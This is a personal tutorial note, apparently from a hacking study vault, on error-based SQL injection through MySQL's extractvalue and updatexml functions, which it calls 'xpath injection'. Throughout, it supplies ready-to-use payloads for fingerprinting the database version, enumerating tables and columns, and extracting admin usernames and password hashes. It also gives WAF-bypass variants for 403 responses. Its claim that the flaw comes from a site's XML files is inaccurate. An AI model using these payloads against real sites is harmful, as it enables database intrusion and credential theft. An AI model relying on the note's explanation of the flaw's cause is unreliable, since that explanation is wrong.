# <mark style="background: #FF5582A6;">Prerequisite :</mark> 
[[2-Sql Injection (Basic)]]
[[3-Sql Injection (Errors)]]
# <mark style="background: #FF5582A6;">Description :</mark> 
due to the problem of having XML files of a site, the xpath injection vulnerability is created (many site don't use XML files, so they don't have this vulnerability).

where do we use the xpath injection :
1. in [[2-Sql Injection (Basic)]] we encountering the following error :
	- <mark style="background: #FF5582A6;">the used SELECT statements have a different number of columns</mark> 

2. when we type (<mark style="background: #FF5582A6;">order by 9999--</mark> ) and show us we don't have this number of columns and we type (<mark style="background: #FF5582A6;">order by 1--</mark> ) and show us again we don't have this number of columns.

3. with this command : (<mark style="background: #FF5582A6;">union select 1,2,3,4,5,6,7,8,9--</mark> )
   doesn't show the vulnerability column.
   (in additio to xpath injection, we can also solve this problem with : [[15-Blind Sql Injection]])

4. before [[2-Sql Injection (Basic)]] we can also try xpath injection because these two, are two separate vulnerabilities.

# How To Do (Steps) :
## Step 1 :
90% of xpath injection is [[2-Sql Injection (Basic)]] command.
only the following command is new :
- <mark style="background: #FFB86CA6;">and extractvalue(rand(),concat(0x7e,version()))--</mark> 
### Point 1 :
if it didn't show us anything in the first step with the first command :
- <mark style="background: #FFB86CA6;"><mark style="background: #FF5582A6;">'</mark> and extractvalue(rand(),concat(0x7e,version()))--<mark style="background: #FF5582A6;">+</mark> </mark> 

### <mark style="background: #FF5582A6;">Point 2</mark> :
[[7-Like (Method)]] can be used in combination with [[6-Limit (Method)]]
(it's explained on last point in [[7-Like (Method)]])
(<mark style="background: #FF5582A6;">reminder :</mark> like method, searches all databases to find the important table)

### Point 3 :
when we reached the important table and found it, for next step we return the limit to the first state, that is : limit 0,1

## Step 2 :
when we see the version, it's means that the vulnerability has been confirmed and the rest of the steps are similar to [[2-Sql Injection (Basic)]] :
- <mark style="background: #FFB86CA6;">and extractvalue(rand(),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))--</mark> 
(limit is used because we don't have group_concat)

### Point :
to find the database, we have the following command :
- <mark style="background: #FFB86CA6;">and extractvalue(rand(),concat(0x7e,(select schema from information_schema.schemata limit 0,1)))--</mark>
## Step 3 :
- <mark style="background: #FFB86CA6;">and extractvalue(rand(),concat(0x7e,(select column_name from information_schema.columns where table_name='the important' table limit 0,1)))--</mark> 
### <mark style="background: #FF5582A6;">Point :</mark> 
the important table must be hexed

## Step 4 :
username and password extraction :
(for example : admin is the important table and user and pass are important columns)

- <mark style="background: #FFB86CA6;">and extractvalue(rand(),concat(0x7e,(select concat(user) from admin limit 0,1)))--</mark> 

### <mark style="background: #FF5582A6;">Very Important Point 1 :</mark> 
with the following command, if the password is hashed, it will not be shown in full.
because the xpath injection can be print <mark style="background: #FF5582A6;">32 characters</mark> and one character is <mark style="background: #FF5582A6;">0x7e</mark> , so the hashed password in xpath injection is always <mark style="background: #FF5582A6;">incomplete</mark> .
to solve this problem, we type the first code (1), we write down the hashed password that is displayed then we type the second code (2), and we wirte down the second hashed password under the first hashed password (every character is below the character of the first hashed password, we add the additional characters of the lower password to the upper password) and <mark style="background: #FF5582A6;">complete the password</mark> .
(<mark style="background: #FF5582A6;">in second code, we delete the 0x7e</mark> )

1. <mark style="background: #FFB86CA6;">and extractvalue(rand(),concat(0x7e,(select concat(pass) from admin limit 0,1)))--</mark> 

2. <mark style="background: #FFB86CA6;">and extractvalue(rand(),concat((select concat(pass) from admin limit 0,1)))--</mark> 

### <mark style="background: #FF5582A6;">Important Point 2 :</mark> 
if we encounter an error with the second code (2), that is, we got an error by deleting 0x7e :
- [[13-Double Query]] Vulnerability

# Errors :
1. if in <mark style="background: #FF5582A6;">first step</mark> we encounter a <mark style="background: #FF5582A6;">403 error</mark> (Forbidden or Not Acceptable) :
	- <mark style="background: #FFB86CA6;">and <mark style="background: #FF5582A6;">/ * !12345</mark> extractvalue(rand(),<mark style="background: #FF5582A6;">CONCAT</mark> (0x7e,version())) <mark style="background: #FF5582A6;">* /</mark> --</mark> 
   in second step :
	- <mark style="background: #FFB86CA6;">and <mark style="background: #FF5582A6;">/ * !12345</mark> extractvalue(rand(),<mark style="background: #FF5582A6;">CONCAT</mark> (0x7e,(select table_name
	  from<mark style="background: #FF5582A6;">/ * * /</mark> information_schema./ * * /tables where table_schema=database()
	  limit 0,1))) <mark style="background: #FF5582A6;">* /</mark> --</mark> 
   we continue the steps and don't change the bypasses we added.
   
   ## Point 1 :
   before the last step, the important table should be hexed, but in the last step, we shouldn't write the important table in hex and also we shouldn't put quotation for the important table.

   ## Point 2 :
   in the last step (4), when we delete from "from" to "the important table", the / * * / bypass sticks to the important table and we encounter a Not Acceptable error.
   what to do ? we write <mark style="background: #FF5582A6;">the second concat</mark> with capital letters ---> <mark style="background: #FF5582A6;">CONCAT</mark> 
   
   - <mark style="background: #FFB86CA6;">and / * !12345extractvalue(rand(),CONCAT(0x7e,(select CONCAT(user)
	   from/ * * /the important table limit 0,1))) * /--</mark> 

2. if we encounter a <mark style="background: #FF5582A6;">403 error</mark> (Forbidden or Not Acceptable) in the <mark style="background: #FF5582A6;">second step</mark> (2) :
	in this case, we <mark style="background: #FF5582A6;">don't have a bypass</mark> , so we ignore the second and third steps and <mark style="background: #FF5582A6;">do the last step</mark> (4).
	
	- <mark style="background: #FFB86CA6;">and extractvalue(rand(),concat(0x7e,(select concat(the important column) from the important table limit 0,1)))--</mark> 
	
	this method is similar to [[9-Version 4]]
	because we have to guess the important table and the important column.
	similar to the [[9-Version 4]], we can also use Burp Suite to guess, first, the important table and second, the important column.

3. if the version is shown in the first step (1), but the important table isn't shown in the second step (2).
    (it means that we don't encounter an any error and the important table doesn't show in web page)
    what to do ? the problem is solved with : <mark style="background: #FF5582A6;">xpath injection (updatexml).</mark> 
    the steps of this method are as follows :

	<mark style="background: #FF5582A6;">version :</mark> 
	
	1. <mark style="background: #FFB86CA6;">and <mark style="background: #FF5582A6;">updatexml</mark> (null,concat(<mark style="background: #FF5582A6;">0x3a</mark> ,version()),<mark style="background: #FF5582A6;">null</mark> )--</mark> 
	
	<mark style="background: #FF5582A6;">table :</mark> 
	
	2. <mark style="background: #FFB86CA6;">and <mark style="background: #FF5582A6;">updatexml</mark> (<mark style="background: #FF5582A6;">null</mark> ,concat(<mark style="background: #FF5582A6;">0x3a</mark> ,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),<mark style="background: #FF5582A6;">null</mark> )--</mark> 
	
	<mark style="background: #FF5582A6;">column :</mark> 
	
	3. <mark style="background: #FFB86CA6;">and <mark style="background: #FF5582A6;">updatexml</mark> (<mark style="background: #FF5582A6;">null</mark> ,concat(<mark style="background: #FF5582A6;">0x3a</mark> ,(select column_name from information_schema.columns where table_name=the important table is hexed limit 0,1)),<mark style="background: #FF5582A6;">null</mark> )--</mark> 
	
	
	<mark style="background: #FF5582A6;">extract information :</mark> 
	
	1. <mark style="background: #FFB86CA6;">and updatexml(null,concat(0x3a,(select concat(UserName,Password) from users limit 0,1)),null)--</mark> 
	
	(UserName and Password as important columns, and users as a important table are examples)

4. if the page doesn't load with the first step command, in the source code, look for the xpath error.

